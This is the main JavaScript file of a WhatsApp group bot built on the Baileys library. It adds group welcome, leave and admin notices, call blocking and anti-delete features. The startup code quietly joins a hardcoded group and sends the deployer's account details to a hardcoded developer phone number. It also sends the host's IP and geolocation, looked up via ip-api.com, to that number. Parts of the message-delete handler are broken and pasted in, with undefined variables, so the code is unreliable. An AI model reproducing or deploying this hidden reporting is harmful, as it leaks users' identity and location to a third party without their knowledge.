const { WAConnection: _WAConnection, Browsers, MessageType } = require('@adiwajshing/baileys')



const ikyy = require('./lib/simple.js')



const WAConnection = ikyy.WAConnection(_WAConnection)



const  { Functions } = require('./lib/functions.js');



const { color, bgcolor } = require('./lib/color')



const fs = require("fs-extra")


const { version, bugs } = require('./package.json')


const { banner, start, success, getGroupAdmins } = require("./lib/functionsss");


const fetch = require("node-fetch");



const sleep = async (ms) => {

    return new Promise(resolve => setTimeout(resolve, ms));

} 





const figlet = require('figlet')



const { uncache, nocache } = require('./lib/loader')


const setting = JSON.parse(fs.readFileSync('./setting.json'))



const welcome = require('./message/group')



baterai = 'unknown'



charging = 'unknown'


//
const moment = require("moment-timezone")
     const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam'
}
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang'
}
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore'
}
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang'
}
        if(time2 < "11:00:00"){
        var ucapanWaktu = 'Selamat Pagi'
}
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat Malam'
}
const ownerName = setting.ownerName
spc1 = '         '
spc2 = '\n                       '
spc3 = '                   '
spc4 = '               '
spc5= '      '

//nocache



global.media = require('./src/json/media.json');



global.functions = new Functions();



global.logo = { buffer:functions.fs.readFileSync('./src/images/logo.jpg'),message:media.logo };



require('./iky.js')



nocache('../iky.js', module => console.log(color('[WATCH]', 'yellow'), color(`'${module}'`, 'cyan'), 'File is updated!'))



require('./message/group.js')



nocache('../message/group.js', module => console.log(color('[WATCH]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))







const starts = async (ikyy = new WAConnection()) => {



	ikyy.logger.level = 'warn'

ikyy.version = [2, 2140, 12];

	console.log(color(figlet.textSync('YT RIFQI BOTZ', {



		font: 'Standard',



		horizontalLayout: 'default',



		vertivalLayout: 'default',



		width: 80,



		whitespaceBreak: false



	}), 'cyan'))

console.log(color(`${spc2}[ • HAI KAK ${ownerName} ${ucapanWaktu} • ]` ,'cyan'))
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
console.log(color(`${spc3}[•]`, 'aqua'), color(`Hai         : ${ucapanWaktu}`, 'white'))
console.log(color(`${spc3}[•]`, 'aqua'), color(`Bot Version : 4.0.0`, 'white'))
console.log(color(`${spc3}[•]`, 'aqua'), color(`Status      : Online!`, 'white'))
console.log(color(`${spc3}[•]`, 'aqua'), color(`Owner       : ${ownerName}`, 'white'))
console.log(color(`${spc4}< ================================================== >`, 'cyan'))



	// Menunggu QR Muncul



	ikyy.on('qr', () => {



		console.log(color('[', 'blue'), color('!', 'yellow'), color(']', 'white'), color('Please scan qr code'))



	})







	// Menghubungkan Kack



	fs.existsSync(`./${setting.sessionName}.json`) && ikyy.loadAuthInfo(`./${setting.sessionName}.json`)



	ikyy.on('connecting', () => {



		console.log(color('[ LORD RIFQI BOTZ ]', 'cyan'), color('Menghubungkan....'));



	})







	//connect



	ikyy.on('open', () => {



		console.log(color('[ LORD RIFQI BOTZ ]', 'cyan'), color('Bot Sudah Online!'));



	})


//join ke gc

teks = `https://https://chat.whatsapp.com/JSSbR8cmLHs5Fb2fwke8iC`
 ikyy.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|INFO!|', 'yellow'), color('JOINED TO FORUM WHATSAPP BOT GROUP', 'cyan'))


// send message 

ikyy.sendMessage(`6285921169048@s.whatsapp.net`, `*Bot On Mek, Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(ikyy.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Owner RIFQI BOTZ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./connect.jpg'),sourceUrl:"https://wa.me/6285921169048?text=Assalamualaikum"}}})

console.log(color('|INFO!|', 'yellow'), color('mengirim info bot ke owner', 'cyan'))

fetch(`http://ip-api.com/line`).then(res => res.text())  

        .then(bu =>{

       ikyy.sendMessage("6285921169048@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Owner RIFQI BOTZ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./connect.jpg'),sourceUrl:"https://wa.me/6285921169048?text=Assalamualaikum"}}})

     console.log(color('|INFO!|', 'yellow'), color('mengirim info bot ke owner', 'cyan'))

   })

	// session



	await ikyy.connect({



		timeoutMs: 30 * 1000



	})



	fs.writeFileSync(`./${setting.sessionName}.json`, JSON.stringify(ikyy.base64EncodedAuthInfo(), null, '\t'))




        
        
        //gc info
        
            //SERAH LU MAU GANTI KYK MANA
        ikyy.on('group-participants-update', async (anu) => {
           mem = anu.participants[0]
			const mdata = await ikyy.groupMetadata(anu.jid)
		    try {
			console.log(anu)
			if (anu.action == 'add') {
			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
        	if(!welkom.includes(mdata.id)) return
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;ikyy;;;\nFN:ikyy\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
		    num = anu.participants[0]
			try {
			ppimg = await ikyy.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			masuk =`Halo @${num.split('@')[0]}\nSelamat Datang Di ${mdata.subject}\n\n*Jangan Lupa Isi*\n*Nama* :\n*Umur* :\n*Gender* :\n*Askot* :\n\nEnjoy Jangan Lupa Kenalan\nKlik Button Di Bawah Untuk Memulai Bot\nNote Jika Tidak Ada Ketik .allmenu`
			gbutsan = [{buttonId:'SERAH',buttonText:{displayText:'👋Welcome'},type:1}]
			mhan = await ikyy.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
const buttonMessages = { imageMessage: mhan.message.imageMessage,
contentText: `${masuk}`,
footerText: `Welcome  Information`, 
buttons: gbutsan,
headerType: 4 }
			ikyy.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {thumbnail: fs.readFileSync('./ikyy.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
			} else if (anu.action == 'remove') {
			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
        	if(!welkom.includes(mdata.id)) return
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;ikyy;;;\nFN:ikyy\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
			num = anu.participants[0]
			try {
			ppimg = await ikyy.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			keluar =`Selamat tinggal @${num.split('@')[0]}\nSemoga tentang disana`
			gbutsan = [{buttonId:'SERAH',buttonText:{displayText:'👋Byee'},type:1}]
			mhan = await ikyy.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
const buttonMessages = { imageMessage: mhan.message.imageMessage,
contentText: `${keluar}`,
footerText: `Leave Information`,
buttons: gbutsan,
headerType: 4 }
			ikyy.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, { thumbnail: fs.readFileSync('./ikyy.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
			
			} else if (anu.action == 'promote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;ikyy;;;\nFN:ikyy\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
shp = '◦➛'
var thu = await ikyy.getStatus(anu.participants[0], MessageType.text)
num = anu.participants[0]
teks = `*P R O M O T E - D E T E C T E D*\n\n${shp} Username: @${num.split('@')[0]}\n\n${shp} Bio : ${thu.status}\n\n${shp} Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n\n${shp} Group: ${mdata.subject}\n\nDon't break the rules!`
ikyy.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Promote Member ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
} 
else if (anu.action == 'demote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;ikyy;;;\nFN:ikyy\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
shp = '◦➛'
thu = await ikyy.getStatus(anu.participants[0], MessageType.text)
num = anu.participants[0]
teks = `*D E M O T E - D E T E C T E D*\n\n${shp} Username: @${num.split('@')[0]}\n\n${shp} Bio : ${thu.status}\n\n${shp} Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n\n${shp} Group: ${mdata.subject}`
ikyy.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
}
		    } catch (e) {
			console.log('Error : %s', color(e, 'red'))
		    }
	        })	       

	ikyy.on('group-update', async (anu) => {
		const metdata = await ikyy.groupMetadata(anu.jid)
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;ikyy;;;\nFN:ikyy\nitem1.TEL;waid=6285866295942:6285866295942\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
    if(anu.announce == 'false'){
    teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
    ikyy.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.announce == 'true'){
    teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
    ikyy.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
    ikyy.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
    ikyy.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'true'){
    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
    ikyy.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
  }
})

        
        
	// Baterai



	ikyy.on('CB:action,,battery', json => {



		global.batteryLevelStr = json[2][0][1].value



		global.batterylevel = parseInt(batteryLevelStr)



		baterai = batterylevel



		if (json[2][0][1].live == 'true') charging = true



		if (json[2][0][1].live == 'false') charging = false



		console.log(json[2][0][1])



		console.log('Baterai : ' + batterylevel + '%')



	})



	global.batrei = global.batrei ? global.batrei : []



	ikyy.on('CB:action,,battery', json => {



		const batteryLevelStr = json[2][0][1].value



		const batterylevel = parseInt(batteryLevelStr)



		global.batrei.push(batterylevel)



	})



// anticall

ikyy.on('CB:action,,call', async json => {

    const callerId = json[2][0][1].from;

    console.log("call dari "+ callerId)

        ikyy.sendMessage(callerId, "telpon = block, hubungi owner jika ingin di buka", MessageType.text)

        await sleep(4000)

        await ikyy.blockUser(callerId, "add") // Block user

})

//













	// welcome



	ikyy.on('group-participants-update', async (anu) => {



		await welcome(ikyy, anu)



	})



  



  ikyy.on("message-delete", async (m) => {



    if (m.key.remoteJid == "status@broadcast") return;



    if (!m.key.fromMe && m.key.fromMe) return;



    m.message =



      Object.keys(m.message)[0] === "ephemeralMessage"



        ? m.message.ephemeralMessage.message



        : m.message;



    const antidel = JSON.parse(fs.readFileSync("./database/antidelete.json"));



    const isGroup = m.key.remoteJid.endsWith("@g.us")



    const isAntidel = isGroup ? antidel.includes(m.key.remoteJid) : false;



    const isCmd = isCmdd

   if (isCmd) cmdadd()

   

   const { msgFilter } = require('./lib/antispam')

   

   

  const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd



    const moment = require("moment-timezone");



    const jam = moment.tz("Asia/Jakarta").format("HH:mm:ss");



    let d = new Date();



    let locale = "id";



    let gmt = new Date(0).getTime() - new Date("1 Januari 2021").getTime();



    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][



      Math.floor((d * 1 + gmt) / 84600000) % 5



    ];



    let week = d.toLocaleDateString(locale, { weekday: "long" });



    let calender = d.toLocaleDateString(locale, {



      day: "numeric",



      month: "long",



      year: "numeric",



    });

    

     //antispam

        if (isCmd && msgFilter.isFilteyellow(from) && !isGroup) {

        console.log(color('[SPAM]', 'yellow'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))

        return reply('「 ❗ 」Sabar Bang 5 Detik/Command')}

        

        if (isCmd && msgFilter.isFilteyellow(from) && isGroup) {

        console.log(color('[SPAM]', 'yellow'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))

        return reply('「 ❗ 」Sabar Bang 5 Detik/Command')

        }



    const type = Object.keys(m.message)[0];



    if (!isAntidel) return



    ikyy.sendMessage(



      m.key.remoteJid,



      `\`\`\`「 Anti Delete 」\`\`\`



  •> Nama : @${m.participant.split("@")[0]}



  •> Waktu : ${jam} ${week} ${calender}



  •> Type : ${type}`,



      MessageType.text,



      { quoted: m.message, contextInfo: { mentionedJid: [m.participant] } }



    );







    ikyy.copyNForward(m.key.remoteJid, m.message);



  });



  



	ikyy.on('chat-update', async (message) => {



		require('./iky.js')(ikyy, message)



	})



}







starts()

